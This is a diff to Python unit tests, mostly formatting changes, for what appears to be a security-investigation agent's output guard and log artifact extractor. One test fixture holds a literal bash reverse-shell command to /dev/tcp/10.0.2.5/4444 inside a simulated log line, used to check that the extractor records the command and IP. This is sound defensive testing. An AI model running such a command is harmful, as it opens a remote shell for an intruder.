@@ -40,12 +40,7 @@ def _state(description="", handoff=None, final_answer=""):
 
 
 def _answer(findings, hypotheses="- No open hypotheses."):
-    return (
-        "## Findings\n"
-        f"{findings}\n\n"
-        "## Hypotheses\n"
-        f"{hypotheses}"
-    )
+    return "## Findings\n" f"{findings}\n\n" "## Hypotheses\n" f"{hypotheses}"
 
 
 class GroundedOutputGuardTests(unittest.TestCase):
@@ -79,17 +74,19 @@ class GroundedOutputGuardTests(unittest.TestCase):
             async def ainvoke(self, args):
                 return self.result
 
-        state = _state(final_answer=(
-            "## Findings\n"
-            "- Event evt-scan observed agent_ip=10.0.2.15 during the scan window.\n\n"
-            "## Hypotheses\n"
-            "- No open hypotheses.\n\n"
-            "## New Leads\n"
-            "- title: Investigate if any subsequent 401/403 or 500 errors were generated during the same scan window\n"
-            "  pivots: agent_ip=10.0.2.15\n"
-            "  evidence: event=evt-scan agent_ip=10.0.2.15 appeared in this task\n"
-            "  priority: 70\n"
-        ))
+        state = _state(
+            final_answer=(
+                "## Findings\n"
+                "- Event evt-scan observed agent_ip=10.0.2.15 during the scan window.\n\n"
+                "## Hypotheses\n"
+                "- No open hypotheses.\n\n"
+                "## New Leads\n"
+                "- title: Investigate if any subsequent 401/403 or 500 errors were generated during the same scan window\n"
+                "  pivots: agent_ip=10.0.2.15\n"
+                "  evidence: event=evt-scan agent_ip=10.0.2.15 appeared in this task\n"
+                "  priority: 70\n"
+            )
+        )
         config = {
             "configurable": {
                 "tools": [
@@ -103,15 +100,23 @@ class GroundedOutputGuardTests(unittest.TestCase):
 
         record.assert_not_called()
 
+
 class ArtifactExtractionTests(unittest.TestCase):
     def test_reverse_shell_diff_text_records_command_and_embedded_ip(self):
-        raw = json.dumps({
-            "_id": "evt-123456",
-            "full_log": "syscheck diff added: /bin/bash -c 'bash -i >& /dev/tcp/10.0.2.5/4444 0>&1'",
-        })
+        raw = json.dumps(
+            {
+                "_id": "evt-123456",
+                "full_log": "syscheck diff added: /bin/bash -c 'bash -i >& /dev/tcp/10.0.2.5/4444 0>&1'",
+            }
+        )
 
         artifacts = extract_artifacts(raw)
         values = {(artifact.kind, artifact.value) for artifact in artifacts}
 
         self.assertIn(("ip", "10.0.2.5"), values)
-        self.assertTrue(any(kind == "command" and "/dev/tcp/10.0.2.5/4444" in value for kind, value in values))
+        self.assertTrue(
+            any(
+                kind == "command" and "/dev/tcp/10.0.2.5/4444" in value
+                for kind, value in values
+            )
+        )
